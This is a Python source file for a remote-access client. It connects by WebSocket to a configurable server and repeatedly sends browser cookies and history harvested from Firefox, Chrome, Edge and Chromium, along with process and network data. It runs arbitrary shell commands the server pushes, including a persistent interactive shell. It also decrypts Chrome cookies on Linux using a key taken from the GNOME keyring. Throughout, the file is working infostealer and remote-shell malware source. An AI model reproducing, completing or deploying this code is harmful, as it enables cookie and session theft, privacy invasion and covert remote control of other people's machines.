import websocket
import json
import time
import random
from threading import Thread
import subprocess
import logging
import platform
import getpass
import sqlite3
import os
import shutil
import tempfile
from pathlib import Path
import secretstorage
import hashlib
from Crypto.Cipher import AES

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Client:
    def __init__(self, client_id, name):
        self.client_id = client_id
        self.name = name
        self.status = "offline"
        self.ws = None
        self.running = True
        self.os = platform.system() + " " + platform.release()  # More detailed OS info

    def get_browser_data(self):
        browser_data = {
            "firefox": {"cookies": [], "history": []},
            "chrome": {"cookies": [], "history": []},
            "edge": {"cookies": [], "history": []},
            "chromium": {"cookies": [], "history": []}
        }

        # Define browser profile paths for Windows and Linux
        paths = {
            "Windows": {
                "firefox": Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles",
                "chrome": Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default",
                "edge": Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default",
                "chromium": Path(os.getenv("LOCALAPPDATA", "")) / "Chromium" / "User Data" / "Default"
            },
            "Linux": {
                "firefox": Path.home() / ".mozilla" / "firefox",
                "chrome": Path.home() / ".config" / "google-chrome" / "Default",
                "edge": Path.home() / ".config" / "microsoft-edge" / "Default",
                "chromium": Path.home() / ".config" / "chromium" / "Default"
            }
        }

        # Check if OS is supported
        os_name = "Windows" if "Windows" in self.os else "Linux" if "Linux" in self.os else None
        if not os_name or os_name not in paths:
            logger.warning(f"Unsupported OS: {self.os}")
            return browser_data

        current_os_paths = paths[os_name]

        def query_db_copy(original_db_path, query, db_name):
            """Copy database to temp directory and query it to avoid file locking issues."""
            if not original_db_path or not original_db_path.exists():
                logger.warning(f"Database file not found: {original_db_path}")
                return []

            temp_dir = None
            try:
                temp_dir = Path(tempfile.mkdtemp())
                temp_db = temp_dir / original_db_path.name
                shutil.copy2(original_db_path, temp_db)
                logger.info(f"Copied {original_db_path} to {temp_db}")

                # Use SQLite URI to ensure read-only access
                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True, timeout=5)
                cursor = conn.cursor()
                cursor.execute(query)
                results = cursor.fetchall()
                logger.info(f"Collected {len(results)} entries from {db_name}")
                conn.close()
                return results
            except (shutil.Error, sqlite3.Error, PermissionError) as e:
                logger.error(f"Error processing {db_name} at {original_db_path}: {e}")
                return []
            finally:
                if temp_dir and temp_dir.exists():
                    try:
                        shutil.rmtree(temp_dir)
                        logger.info(f"Cleaned up temporary directory: {temp_dir}")
                    except Exception as e:
                        logger.error(f"Failed to clean up {temp_dir}: {e}")

        # Firefox
        if "firefox" in current_os_paths:
            firefox_base_path = current_os_paths["firefox"]
            if firefox_base_path.exists():
                # Find the default profile (e.g., *.default-release)
                profile_dir = next((d for d in firefox_base_path.glob("*.default-release") if d.is_dir()), None)
                if profile_dir:
                    cookies_db = profile_dir / "cookies.sqlite"
                    history_db = profile_dir / "places.sqlite"
                    cookie_results = query_db_copy(cookies_db, "SELECT host, name, value FROM moz_cookies", "Firefox cookies")
                    browser_data["firefox"]["cookies"] = [
                        {"host": row[0], "name": row[1], "value": row[2]} for row in cookie_results
                    ]
                    history_results = query_db_copy(history_db, "SELECT url, title FROM moz_places", "Firefox history")
                    browser_data["firefox"]["history"] = [
                        {"url": row[0], "title": row[1] if row[1] else "No Title"} for row in history_results
                    ]
                else:
                    logger.warning("No default-release Firefox profile found")

        # Chrome, Edge, Chromium
        for browser in ["chrome", "edge", "chromium"]:
            if browser in current_os_paths:
                browser_base_path = current_os_paths[browser]
                if browser_base_path.exists():
                    cookies_db = browser_base_path / "Cookies"
                    history_db = browser_base_path / "History"
                    cookie_results = query_db_copy(cookies_db, "SELECT host_key, name, encrypted_value FROM cookies", f"{browser} cookies")
                    browser_data[browser]["cookies"] = [
                        {"host": row[0], "name": row[1], "value": "encrypted" if row[2] else "N/A"} for row in cookie_results
                    ]
                    history_results = query_db_copy(history_db, "SELECT url, title FROM urls", f"{browser} history")
                    browser_data[browser]["history"] = [
                        {"url": row[0], "title": row[1] if row[1] else "No Title"} for row in history_results
                    ]
                else:
                    logger.warning(f"{browser} directory not found: {browser_base_path}")

        logger.info(f"Browser data prepared: {json.dumps({k: v for k, v in browser_data.items() if v['cookies'] or v['history']}, indent=2)}")
        return browser_data

    def get_system_data(self):
        """Get system information including processes and network data."""
        system_info = {
            "processes": [],
            "network": []
        }
        
        try:
            if "Windows" in self.os:
                # Get processes using PowerShell
                ps_processes = subprocess.run(
                    ["powershell.exe", "-Command", "Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet, UserName | ConvertTo-Json"],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if ps_processes.returncode == 0:
                    processes = json.loads(ps_processes.stdout)
                    system_info["processes"] = [
                        {
                            "pid": str(proc["Id"]),
                            "name": proc["ProcessName"],
                            "cpu_percent": float(proc["CPU"]),
                            "memory_percent": float(proc["WorkingSet"]) / 1024 / 1024,  # Convert to MB
                            "username": proc["UserName"]
                        }
                        for proc in processes
                    ]

                # Get network interfaces using PowerShell
                ps_network = subprocess.run(
                    ["powershell.exe", "-Command", "Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength | ConvertTo-Json"],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if ps_network.returncode == 0:
                    network = json.loads(ps_network.stdout)
                    system_info["network"] = [
                        {
                            "interface": net["InterfaceAlias"],
                            "ip": net["IPAddress"],
                            "netmask": f"/{net['PrefixLength']}"
                        }
                        for net in network
                    ]
            else:
                # Linux processes
                ps_output = subprocess.run(
                    ["ps", "-eo", "pid,comm,%cpu,%mem,user", "--no-headers"],
                    capture_output=True,
                    text=True
                )
                if ps_output.returncode == 0:
                    for line in ps_output.stdout.splitlines():
                        pid, name, cpu, mem, user = line.strip().split()
                        system_info["processes"].append({
                            "pid": pid,
                            "name": name,
                            "cpu_percent": float(cpu),
                            "memory_percent": float(mem),
                            "username": user
                        })

                # Linux network interfaces
                ip_output = subprocess.run(
                    ["ip", "addr", "show"],
                    capture_output=True,
                    text=True
                )
                if ip_output.returncode == 0:
                    current_interface = None
                    for line in ip_output.stdout.splitlines():
                        if ":" in line and not line.startswith(" "):
                            current_interface = line.split(":")[1].strip()
                        elif "inet " in line and current_interface:
                            ip_info = line.split()
                            ip = ip_info[1].split("/")[0]
                            netmask = "/" + ip_info[1].split("/")[1]
                            system_info["network"].append({
                                "interface": current_interface,
                                "ip": ip,
                                "netmask": netmask
                            })

        except Exception as e:
            logger.error(f"Error collecting system data: {e}")

        return system_info

    def on_message(self, ws, message):
        logger.info(f"Received from server for {self.name}: {message}")
        try:
            data = json.loads(message)
            if data.get("type") == "ping":
                self.ws.send(json.dumps({"type": "pong"}))
            elif data.get("type") == "error":
                logger.error(f"Server error: {data.get('message')}")
                self.status = "offline"
            elif data.get("type") == "script":
                shell = data.get("shell")
                script = data.get("script")
                is_shell_session = data.get("is_shell_session", False)
                
                if is_shell_session:
                    # For shell sessions, we'll use a persistent shell process
                    if not hasattr(self, 'shell_process'):
                        self.shell_process = self.start_shell_session(shell)
                    
                    # Send command to the shell process
                    self.shell_process.stdin.write(f"{script}\n")
                    self.shell_process.stdin.flush()
                    
                    # Read output
                    output = self.shell_process.stdout.readline()
                    response = {
                        "type": "script_response",
                        "client_id": self.client_id,
                        "result": output,
                        "request_id": data.get("request_id", str(time.time())),
                        "is_shell_session": True
                    }
                    self.ws.send(json.dumps(response))
                else:
                    # Regular script execution
                    result = self.execute_script(shell, script)
                    response = {
                        "type": "script_response",
                        "client_id": self.client_id,
                        "result": result,
                        "request_id": data.get("request_id", str(time.time())),
                        "is_shell_session": False
                    }
                    self.ws.send(json.dumps(response))
            elif data.get("type") == "shell_command":
                result = self.execute_script("bash" if "Linux" in self.os else "powershell", data["command"])
                self.ws.send(json.dumps({
                    "type": "shell_response",
                    "client_id": self.client_id,
                    "output": result,
                    "session_id": data.get("session_id")
                }))
        except Exception as e:
            logger.error(f"Error processing message: {e}")

    def execute_script(self, shell, script):
        """Execute scripts in a platform-agnostic way."""
        try:
            if script.strip().lower() == "whoami":
                return getpass.getuser()

            if "Windows" in self.os:
                if shell == "powershell":
                    result = subprocess.run(
                        ["powershell.exe", "-Command", script],
                        capture_output=True,
                        text=True,
                        shell=True  # Use shell=True for Windows compatibility
                    )
                elif shell == "bash":  # Emulate bash-like behavior on Windows via cmd
                    result = subprocess.run(
                        ["cmd.exe", "/c", script],
                        capture_output=True,
                        text=True,
                        shell=True
                    )
                else:
                    return f"Unsupported shell on Windows: {shell}"
            elif "Linux" in self.os:
                if shell == "bash":
                    result = subprocess.run(
                        script,
                        shell=True,
                        capture_output=True,
                        text=True,
                        executable="/bin/bash"
                    )
                elif shell == "powershell":
                    return "PowerShell not natively supported on Linux"
                else:
                    return f"Unsupported shell: {shell}"
            else:
                return f"Unsupported OS: {self.os}"

            return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
        except Exception as e:
            return f"Execution error: {str(e)}"

    def on_error(self, ws, error):
        logger.error(f"WebSocket error: {error}")
        self.status = "offline"

    def on_close(self, ws, close_status_code, close_msg):
        logger.info(f"Connection closed: {close_status_code} - {close_msg}")
        self.status = "offline"

    def on_open(self, ws):
        logger.info("Connected to server")
        self.status = "online"
        self.send_status()

    def send_status(self):
        if self.ws and self.status == "online":
            data = {
                "client_id": self.client_id,
                "name": self.name,
                "status": self.status,
                "lastActive": time.strftime("%H:%M:%S"),
                "os": self.os,
                "browser_data": self.get_browser_data(),
                "system_info": self.get_system_data()
            }
            try:
                logger.info(f"Sending status data: {json.dumps(data, indent=2)}")
                self.ws.send(json.dumps(data))
            except Exception as e:
                logger.error(f"Send error: {e}")
                self.status = "offline"

    def connect(self):
        while self.running:
            try:
                # Get server IP from environment variable, or use localhost by default
                server_ip = os.getenv('SERVER_IP', '127.0.0.1')
                server_port = os.getenv('SERVER_PORT', '8000')
                ws_url = f"ws://{server_ip}:{server_port}/ws"
                
                self.ws = websocket.WebSocketApp(
                    ws_url,
                    on_open=self.on_open,
                    on_message=self.on_message,
                    on_error=self.on_error,
                    on_close=self.on_close
                )
                logger.info(f"Attempting to connect to {ws_url}")
                self.ws.run_forever(ping_interval=10, ping_timeout=5)
            except Exception as e:
                logger.error(f"Connection failed: {e}")
            if self.running:
                logger.info("Attempting to reconnect in 5 seconds...")
                time.sleep(5)

    def simulate_activity(self):
        while self.running:
            if self.status == "online":
                self.send_status()
            time.sleep(random.randint(5, 10))

    def stop(self):
        self.running = False
        if self.ws:
            try:
                self.ws.close()
            except Exception as e:
                logger.error(f"Error closing WebSocket: {e}")

    def start_shell_session(self, shell):
        """Start a persistent shell session"""
        try:
            if "Windows" in self.os:
                if shell == "powershell":
                    process = subprocess.Popen(
                        ["powershell.exe"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        shell=True
                    )
                else:
                    process = subprocess.Popen(
                        ["cmd.exe"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        shell=True
                    )
            else:
                process = subprocess.Popen(
                    ["/bin/bash"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            return process
        except Exception as e:
            logger.error(f"Error starting shell session: {e}")
            return None

    def decrypt_linux_chrome_cookie(self, encrypted_value):
        try:
            # Connect to GNOME Keyring
            connection = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(connection)
            
            # Find Chrome's cookie encryption key
            for item in collection.get_all_items():
                if item.get_label() == 'Chrome Safe Storage':
                    key = item.get_secret()
                    # Derive the actual encryption key
                    iv = b' ' * 16
                    length = 16
                    salt = b'saltysalt'
                    iterations = 1
                    
                    key = hashlib.pbkdf2_hmac('sha1', key, salt, iterations, length)
                    
                    # Decrypt the cookie
                    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
                    decrypted = cipher.decrypt(encrypted_value[3:])
                    
                    # Remove padding
                    padding_length = decrypted[-1]
                    decrypted = decrypted[:-padding_length]
                    return decrypted.decode()
            
            return "Key not found"
        except Exception as e:
            logger.error(f"Linux cookie decryption error: {e}")
            return "Decryption failed"

def generate_client_id():
    """Generate a unique client ID and store it in a file."""
    id_file = "used_client_ids.txt"
    used_ids = set()

    try:
        if os.path.exists(id_file):
            with open(id_file, "r", encoding="utf-8") as f:
                used_ids = set(line.strip() for line in f if line.strip())

        while True:
            new_id = f"{random.randint(0, 999):03d}-{random.randint(0, 999):03d}-{random.randint(0, 999):03d}"
            if new_id not in used_ids:
                used_ids.add(new_id)
                with open(id_file, "a", encoding="utf-8") as f:
                    f.write(f"{new_id}\n")
                return new_id
    except (IOError, PermissionError) as e:
        logger.error(f"Error handling client ID file: {e}")
        return f"temp-{random.randint(100, 999)}"  # Fallback ID

def main():
    client_id = generate_client_id()
    name = f"Client_{client_id}"

    client = Client(client_id, name)

    connect_thread = Thread(target=client.connect, daemon=True)
    activity_thread = Thread(target=client.simulate_activity, daemon=True)
    connect_thread.start()
    activity_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down client...")
        client.stop()

if __name__ == "__main__":
    main()